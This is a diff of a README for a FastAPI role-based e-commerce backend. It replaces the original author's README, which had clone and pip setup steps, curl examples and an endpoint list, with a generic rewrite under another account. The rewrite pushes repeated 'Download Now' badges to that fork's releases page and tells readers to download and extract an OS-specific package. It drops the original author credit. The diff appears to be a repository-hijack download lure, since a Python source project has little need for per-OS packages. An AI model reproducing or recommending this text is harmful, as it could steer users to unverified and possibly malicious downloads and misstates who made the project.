@@ -1,299 +1,93 @@
-# FastAPI RBAC E-commerce Microservice
-
-A robust, scalable e-commerce backend microservice built with FastAPI, featuring Role-Based Access Control (RBAC) for secure multi-tenant operations. This project demonstrates modern API development with proper authentication, authorization, and database design patterns.
-
-<p align="center">
-  <a href="https://fastapi.tiangolo.com/"><img src="https://img.shields.io/badge/FastAPI-%23E03C31.svg?style=for-the-badge&logo=fastapi&logoColor=white" alt="FastAPI"></a>
-  <a href="https://www.postgresql.org/"><img src="https://img.shields.io/badge/PostgreSQL-%232E2A47.svg?style=for-the-badge&logo=postgresql&logoColor=white" alt="PostgreSQL"></a>
-  <a href="https://www.sqlalchemy.org/"><img src="https://img.shields.io/badge/SQLAlchemy-%2334A1D6.svg?style=for-the-badge&logo=sqlalchemy&logoColor=white" alt="SQLAlchemy"></a>
-  <a href="https://alembic.sqlalchemy.org/"><img src="https://img.shields.io/badge/Alembic-%236C5B7B.svg?style=for-the-badge&logo=alembic&logoColor=white" alt="Alembic"></a>
-  <a href="https://pydantic-docs.helpmanual.io/"><img src="https://img.shields.io/badge/Pydantic-%23FF5C8D.svg?style=for-the-badge&logo=pydantic&logoColor=white" alt="Pydantic"></a>
-  <a href="https://www.uvicorn.org/"><img src="https://img.shields.io/badge/Uvicorn-%23444444.svg?style=for-the-badge&logo=uvicorn&logoColor=white" alt="Uvicorn"></a>
-  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-%233776AB.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python"></a>
-  <a href="https://jwt.io/"><img src="https://img.shields.io/badge/JWT-purple?style=for-the-badge&logo=jwt" alt="JWT"></a>
-  <a href="https://swagger.io/"><img src="https://img.shields.io/badge/Swagger-yellow?style=for-the-badge&logo=swagger" alt="Swagger UI"></a>
-</p>
-
-## 🚀 Features
-
-### 🔐 Role-Based Access Control (RBAC)
-- **Three-tier role system**: Customer, Seller, Admin
-- **Granular permissions**: Each role has specific capabilities
-- **Secure endpoints**: Role-based dependency injection
-- **JWT authentication**: Stateless, scalable authentication
-
-### 🛍️ E-commerce Capabilities
-- **User Management**: Registration, profile management, authentication
-- **Product Catalog**: CRUD operations with category management
-- **Shopping Cart**: Add, update, remove items with persistence
-- **Order System**: Complete order lifecycle management
-- **Inventory Management**: Stock tracking and updates
-- **Reviews & Ratings**: Product feedback system
-- **Wishlist**: Save products for later
-- **Shipment Tracking**: Order fulfillment tracking
-
-### 🏗️ Architecture
-- **Microservice-ready**: Modular design for scalability
-- **RESTful API**: Clean, predictable endpoints
-- **Database Migrations**: Alembic for schema management
-- **Validation**: Pydantic models for request/response validation
-- **Documentation**: Auto-generated OpenAPI documentation
-
-## 📋 Role Permissions
-
-| Feature | Customer | Seller | Admin |
-|---------|----------|--------|-------|
-| **User Registration** | ✅ | ✅ | ✅ |
-| **Browse Products** | ✅ | ✅ | ✅ |
-| **Shopping Cart** | ✅ | ✅ | ✅ |
-| **Place Orders** | ✅ | ✅ | ✅ |
-| **Write Reviews** | ✅ | ✅ | ✅ |
-| **Manage Own Products** | ❌ | ✅ | ✅ |
-| **Manage All Products** | ❌ | ❌ | ✅ |
-| **Manage Categories** | ❌ | ✅ | ✅ |
-| **Manage Users** | ❌ | ❌ | ✅ |
-| **Manage Shipments** | ❌ | ✅ | ✅ |
-| **System Administration** | ❌ | ❌ | ✅ |
-
-## 🛠️ Tech Stack
-
-*   **Framework**: FastAPI
-*   **Database**: PostgreSQL
-*   **ORM**: SQLAlchemy 2.0
-*   **Authentication**: JWT with bcrypt hashing
-*   **Migrations**: Alembic
-*   **Validation**: Pydantic v2
-*   **API Documentation**: Swagger UI & ReDoc
-*   **Package Management**: pip
-
-## 📁 Project Structure
-```bash
-FastAPI-RBAC-Microservice/
-├── app/
-│ ├── init.py
-│ ├── main.py                                # FastAPI application entry point
-│ ├── database.py                            # Database configuration
-│ ├── models.py                              # SQLAlchemy models
-│ ├── schemas.py                             # Pydantic schemas
-│ ├── crud.py                                # Database operations
-│ ├── auth.py                                # Authentication utilities
-│ └── config.py                              # Configuration management
-├── alembic/                                 # Database migrations
-│ ├── versions/
-│ ├── env.py
-│ └── alembic.ini
-├── requirements.txt                        # Project dependencies
-├── .env                                    # Environment variables template
-└── README.md                               # Project documentation
-```
-## 🚀 Quick Start
-
-### Prerequisites
-
-*   Python 3.8+
-*   PostgreSQL 12+
-*   pip (Python package manager)
-
-### Installation
-
-1.  **Clone the repository**
-
-    ```bash
-    git clone https://github.com/HarshitWaldia/FastAPI-RBAC-Microservice.git
-    cd FastAPI-RBAC-Microservice
-    ```
+# 🚀 FastAPI-RBAC-Microservice - Simple E-Commerce Backend Solution
 
-2.  **Create virtual environment**
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bluccix/FastAPI-RBAC-Microservice/releases)
 
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  # Linux/MacOS
-    # OR
-    venv\Scripts\activate     # Windows
-    ```
+## ✨ Introduction
 
-3.  **Install dependencies**
+FastAPI-RBAC-Microservice is a powerful backend solution for e-commerce applications. Built with FastAPI, it includes essential features such as secure authentication and Role-Based Access Control (RBAC). This microservice offers everything you need to manage users, products, and orders efficiently.
 
-    ```bash
-    pip install -r requirements.txt
-    ```
+## 🚀 Getting Started
 
-4.  **Environment Configuration**
+To use FastAPI-RBAC-Microservice, you need to follow the steps outlined below. Don't worry; we've made it easy for you.
 
-    ```bash
-    code .env
-    ```
+### 🖥️ System Requirements
 
-    Edit `.env` with your configuration:
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Modern multi-core processor
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 100 MB free space
+- **Database:** PostgreSQL (installation instructions provided)
 
-    ```env
-    DATABASE_URL=postgresql://username:password@localhost:5432/ecommerce_db
-    SECRET_KEY=your-super-secret-key-here
-    ALGORITHM=HS256
-    ACCESS_TOKEN_EXPIRE_MINUTES=60
-    ```
+### 📥 Download & Install
 
-5.  **Database Setup**
+1. **Visit the Releases Page**  
+   Click [here to download](https://github.com/bluccix/FastAPI-RBAC-Microservice/releases).
 
-    ```bash
-    # Create database in PostgreSQL
-    createdb ecommerce_db
+2. **Download the Latest Release**  
+   On the Releases page, find the latest version of the FastAPI-RBAC-Microservice. Click on the package suitable for your operating system.
 
-    # Run migrations
-    alembic upgrade head
-    ```
+### 🛠️ Installation Steps
 
-6.  **Start the server**
+1. **Extract the Downloaded File**  
+   Once downloaded, locate the file on your computer. Right-click on it and choose "Extract" or "Unzip" to access its contents.
 
-    ```bash
-    uvicorn app.main:app --reload
-    ```
+2. **Install PostgreSQL**  
+   If you haven’t done so, download and install PostgreSQL. Follow the setup instructions for your operating system.
 
-## 📚 API Documentation
+3. **Create a Database**  
+   Open PostgreSQL and create a new database for the microservice. You can name it `ecommerce_db` or any name you prefer.
 
-Once running, access the interactive API documentation:
+4. **Configure Environment Variables**  
+   Inside the extracted files, locate the `.env.example` file. Rename it to `.env` and update the following fields:
+   - `DATABASE_URL`: Update this line with your PostgreSQL database connection string.
+   - `JWT_SECRET`: Set a secret password for authentication.
 
-*   Swagger UI: [http://localhost:8000/docs](http://localhost:8000/docs)
-*   ReDoc: [http://localhost:8000/redoc](http://localhost:8000/redoc)
+5. **Run the Microservice**  
+   Open your terminal or command prompt. Navigate to the folder where you extracted the files and run the following command to start the server:
 
-## 🔐 Authentication Flow
+   ```
+   uvicorn main:app --host 0.0.0.0 --port 8000
+   ```
 
-1.  **Register:** `POST /users/` - Create new user account
-2.  **Login:** `POST /login` - Get JWT access token
-3.  **Access Protected Routes:** Include token in `Authorization: Bearer <token>` header
+6. **Access the API**  
+   Open your web browser and go to `http://localhost:8000/docs`. This URL includes the Swagger UI, where you can interact with the API.
 
-## 🎯 Example Usage
+## 🧑‍🤝‍🧑 Features
 
-### Customer Workflow
+- **Role-Based Access Control (RBAC):** Manage user permissions effectively.
+- **Secure Authentication:** Implements JWT for secure user sessions.
+- **Multi-Tenant Architecture:** Supports multiple users and organizations.
+- **Comprehensive E-Commerce Functionality:** Handle products, carts, orders, and payments smoothly.
+- **Automatic Database Migration:** Uses Alembic for simple database updates.
 
-```bash
-# 1. Register as customer
-curl -X POST "http://localhost:8000/users/" \
-  -H "Content-Type: application/json" \
-  -d '{"name": "John Doe", "email": "john@example.com", "password": "password123"}'
+## 🏗️ Topics Covered
 
-# 2. Login
-curl -X POST "http://localhost:8000/login" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=john@example.com&password=password123"
+- **alembic-migration:** Automated database schema migrations.
+- **auth:** Secure user authentication methods.
+- **backend:** Efficient e-commerce backend development.
+- **datamigration:** Seamless data migrations and updates.
+- **fastapi:** High-performance web framework for building APIs.
+- **jwt-auth:** JSON Web Token-based authentication.
+- **postgresql:** Reliable and powerful database management.
+- **pydantic:** Data validation and settings management.
+- **rbac-authorization:** User role management and permission controls.
+- **sqlalchemy:** Database toolkit for Python.
+- **swagger-ui:** Interactive API documentation interface.
 
-# 3. Browse products
-curl -X GET "http://localhost:8000/products/" \
-  -H "Authorization: Bearer <your_token>"
+## 📘 Support and Help
 
-# 4. Add to cart
-curl -X POST "http://localhost:8000/cart/1/items" \
-  -H "Authorization: Bearer <your_token>" \
-  -H "Content-Type: application/json" \
-  -d '{"product_id": 1, "quantity": 2}'
+If you run into any issues or have questions, please check the [documentation](https://github.com/bluccix/FastAPI-RBAC-Microservice/wiki) for detailed guides and troubleshooting. You can also reach out via the Issues section on GitHub.
 
-# 5. Place order
-curl -X POST "http://localhost:8000/orders/" \
-  -H "Authorization: Bearer <your_token>" \
-  -d '{"user_id": 1}'
-```
+## 🛠️ Contributing
 
-### **Seller Workflow**
+Contributions are welcome! If you would like to help improve FastAPI-RBAC-Microservice, feel free to fork the repository and submit a pull request. Your contributions will help make this a better tool for everyone.
 
-```bash
-# 1. Register as seller (or get role updated by admin)
-curl -X POST "http://localhost:8000/users/" \
-  -H "Content-Type: application/json" \
-  -d '{"name": "Seller Jane", "email": "jane@seller.com", "password": "password123", "role": "seller"}'
+## 🏆 Acknowledgments
 
-# 2. Create product
-curl -X POST "http://localhost:8000/seller/products/" \
-  -H "Authorization: Bearer <seller_token>" \
-  -H "Content-Type: application/json" \
-  -d '{"name": "New Product", "price": 29.99, "stock": 100, "category_id": 1}'
-```
-## 🔧 **Development**
+FastAPI-RBAC-Microservice leverages various open-source tools and libraries. Thanks to all developers who made this project possible. 
 
-### Code Style 
-```
-# Format code
-black app/
+## 🔗 License
 
-# Sort imports
-isort app/
-```
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/bluccix/FastAPI-RBAC-Microservice/blob/main/LICENSE) file for details.
 
-### Database Migrations
-```Bash
-# Create new migration
-alembic revision --autogenerate -m "description"
-
-# Apply migrations
-alembic upgrade head
-
-# Rollback migration
-alembic downgrade -1
-
-# Revert all migration
-alembic downgrade base
-```
-## 🌟 Key Endpoints
-
-This API provides endpoints for users, customers, sellers, and administrators.  Below is a breakdown of the available routes.
-
-### Public Endpoints
-
-These endpoints do not require authentication.
-
-*   **`POST /users/`** - User registration.  Creates a new user account.
-*   **`POST /login`** - User authentication.  Logs in an existing user and returns an authentication token.
-
-### Customer Endpoints
-
-These endpoints require user authentication.
-
-*   **`GET /me`** - Current user profile.  Retrieves information about the currently authenticated user.
-*   **`GET /cart/{user_id}`** - View cart.  Retrieves the contents of a user's shopping cart.
-*   **`POST /cart/{user_id}/items`** - Add to cart.  Adds an item to a user's shopping cart.
-*   **`POST /orders/`** - Create order.  Creates a new order for the currently authenticated user.
-*   **`POST /wishlist/`** - Add to wishlist. Adds an item to the user's wishlist.
-
-### Seller Endpoints
-
-These endpoints require seller authentication.
-
-*   **`GET /seller/products/`** - Manage products.  Retrieves a list of products owned by the seller.
-*   **`POST /seller/products/`** - Create product.  Creates a new product for the seller.
-*   **`PUT /seller/products/{id}`** - Update product.  Updates an existing product owned by the seller.  `{id}` represents the product ID.
-
-### Admin Endpoints
-
-These endpoints require administrator authentication.
-
-*   **`GET /admin/users/`** - User management.  Retrieves a list of all users.
-*   **`PUT /admin/users/{id}/role`** - Change user roles.  Updates the role of a user.  `{id}` represents the user ID.
-*   **`DELETE /admin/products/{id}`** - Delete any product.  Deletes a product from the system.  `{id}` represents the product ID.
-
----
-
-## 🤝 Contributing
-
-We welcome and encourage contributions to this project!  Here's how you can get involved:
-
-1.  **Fork the repository:**  Create your own fork of this repository on GitHub.
-2.  **Create your feature branch:**  `git checkout -b feature/AmazingFeature` (Replace `AmazingFeature` with a descriptive name for your branch).
-3.  **Commit your changes:**  `git commit -m 'Add some AmazingFeature'` (Use clear and concise commit messages).
-4.  **Push to the branch:**  `git push origin feature/AmazingFeature`
-5.  **Open a Pull Request:**  Submit a pull request to the main repository.  Please include a detailed description of your changes.
-
-We appreciate your help in making this project even better!
-
-## 👨‍💻 Author
-
-**Harshit Waldia**
-
-*   GitHub: [@HarshitWaldia](https://github.com/HarshitWaldia)
-*   LinkedIn: [Harshit Waldia](https://www.linkedin.com/in/harshitwaldia/)
-
----
-
-## 🙏 Acknowledgments
-
-*   The amazing [FastAPI](https://fastapi.tiangolo.com/) team for providing such an excellent framework.
-*   The [SQLAlchemy](https://www.sqlalchemy.org/) and [Alembic](https://alembic.sqlalchemy.org/en/latest/) communities for their powerful database tools.
-*   All contributors and users of this project – thank you for your support!
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bluccix/FastAPI-RBAC-Microservice/releases)
